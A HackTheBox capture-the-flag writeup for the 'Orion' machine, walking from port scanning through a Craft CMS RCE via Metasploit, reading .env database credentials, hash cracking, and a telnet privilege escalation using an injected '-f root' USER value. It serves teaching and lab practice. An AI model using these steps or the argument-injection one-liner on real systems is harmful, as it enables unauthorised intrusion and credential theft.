
```markdown
# Orion — HackTheBox Writeup

## Enumeration

nmap scan returned 2 open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

visited the site and ran background fuzzing for subdomains and directories.
noticed the site is running **Craft CMS** — version found in the admin panel
via directory fuzzing.

it has an RCE: **CVE-2025-32432**

---

## Foothold

tried almost all the POCs available on GitHub, generated and modified them too,
none worked. tried the Metasploit module:

```
linux/http/craftcms_preauth_rce_cve_2025_32432
```

set RHOST to orion.htb and LHOST to tun0 — got a Meterpreter session.

---

## Credential Discovery

found a .env file containing:

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecure****
CRAFT_DB_DATABASE=orion
```

MySQL kept failing in the reverse shell so uploaded chisel, made a tunnel,
then connected via proxychains.

dumped the users table — found a bcrypt hash for adam@orion.htb, cracked it:
password: `dark****`

---

## User Flag

SSH'd in as adam:

```
user.txt: 2e0bf0**************************
```

---

## Privilege Escalation

linpeas didn't return anything interesting so moved to manual recon.
spotted an internal telnet service:

```
127.0.0.1:telnet   LISTEN
```

tried adam's creds — no luck. checked the version — running **inetutils 2.7**
which is vulnerable to unauthenticated privesc.

reference: https://www.openwall.com/lists/oss-security/2026/01/20/2

```bash
USER='-f root' telnet -a localhost
```

landed as root.

---

## Root Flag

```
root.txt: 514305**************************
```
```

Rating : 4/5
